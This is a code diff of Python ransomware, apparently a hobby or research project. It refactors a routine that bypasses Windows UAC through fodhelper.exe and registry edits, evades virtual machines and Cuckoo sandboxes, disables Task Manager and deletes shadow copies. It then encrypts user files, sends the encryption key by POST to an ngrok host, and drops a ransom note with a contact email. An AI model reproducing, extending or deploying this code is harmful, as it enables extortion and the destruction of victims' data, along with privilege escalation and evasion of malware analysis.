@@ -1,13 +1,12 @@
 # Extracted from https://dzone.com/articles/bypassing-windows-10-uac-withnbsppython
-import os
-import sys
-import ctypes
-import winreg
-
 from CryptoManager import CryptoManager
 from VirtualEnvironmentDetector import VirtualEnvironmentDetector
 import winshell
 import uuid
+import os
+import sys
+import ctypes
+import winreg
 
 CMD                   = r"C:\Windows\System32\cmd.exe"
 FOD_HELPER            = r'C:\Windows\System32\fodhelper.exe'
@@ -51,11 +50,14 @@ def bypass_uac(cmd):
         raise
 
 
-def execute():        
+def execute_protocol(antivm=True, send_post=True, executable=True):        
     if not is_running_as_admin():
         try:
-            name = sys.executable
-            cmd = '{} /k {}'.format(CMD, name)
+            if executable:
+                name = sys.executable
+                cmd = '{} /k {}'.format(CMD, name)
+            else:
+                cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, __file__)
             print(cmd)
             bypass_uac(cmd)                
             os.system(FOD_HELPER)                
@@ -71,13 +73,14 @@ def execute():
                 print('Nothing to do here...')
                 sys.exit()
 
-            if ved.neo_takes_blue_pill(tolerance=10):
-                print('Exiting the matrix...')
-                sys.exit()
+            if antivm: 
+                if ved.neo_takes_blue_pill(tolerance=0):
+                    print('Exiting the matrix...')
+                    sys.exit()
 
-            if ved.delay_anti_cuckoo(0):
-                print("We are being analyzed...")
-                sys.exit()
+                if ved.delay_anti_cuckoo(5*60):
+                    print("We are being analyzed...")
+                    sys.exit()
 
             cm = CryptoManager(action='encrypt')
 
@@ -86,7 +89,7 @@ def execute():
             try:
                 cm.disable_task_manager()
                 cm.delete_shadowcopies()
-                print("Task manager disbled and shadow copies eliminated")
+                print("Task manager disabled and shadow copies eliminated")
             except:
                 print("Disable task scheduler and delete shadow copies operations failed")
 
@@ -104,7 +107,7 @@ def execute():
                             cm.symmetric_encrypt_or_decrypt(full_path)
                             print(full_path + ' -> [encrypted]')
             
-            # cm.send_post_request(url='http://3d1843105e2e.ngrok.io', id=str(id), key=cm.key)
+            if send_post: cm.send_post_request(url='http://3d1843105e2e.ngrok.io', id=str(id), key=cm.key)
 
             msg = 'ATTENTION! ALL YOUR DATA ARE PROTECTED WITH AES ALGORITHM\nYour security system was vulnerable, so all of your files are encrypted.\nIf you want to restore them, contact us by email: restoreyourfiles.gengar@gmail.com, indicating {} as email subject.\n\nBE CAREFUL AND DO NOT DAMAGE YOUR DATA:\nDo not rename encrypted files.\nDo not try to decrypt your data using third party software, it may cause permanent data loss.\nDo not trust anyone! Only we have keys to your files! Without this keys restore your data is impossible\n\nWE GUARANTEE A FREE DECODE AS A PROOF OF OUR POSSIBILITIES:\nYou can send us 2 files for free decryption.\nSize of file must be less than 1 Mb (non archived). We don`t decrypt for test DATABASE, XLS and other important files.\n\nDO NOT ATTEMPT TO DECODE YOUR DATA YOURSELF, YOU ONLY DAMAGE THEM AND THEN YOU LOSE THEM FOREVER\nAFTER DECRYPTION YOUR SYSTEM WILL RETURN TO A FULLY NORMALLY AND OPERATIONAL CONDITION!'.format(id)
             desktop_path = winshell.desktop()
@@ -117,7 +120,7 @@ def execute():
        
 
 if __name__ == '__main__':
-    execute()
+    execute_protocol(antivm=False, send_post=False, executable=False)
     
 """
 from CryptoManager import CryptoManager
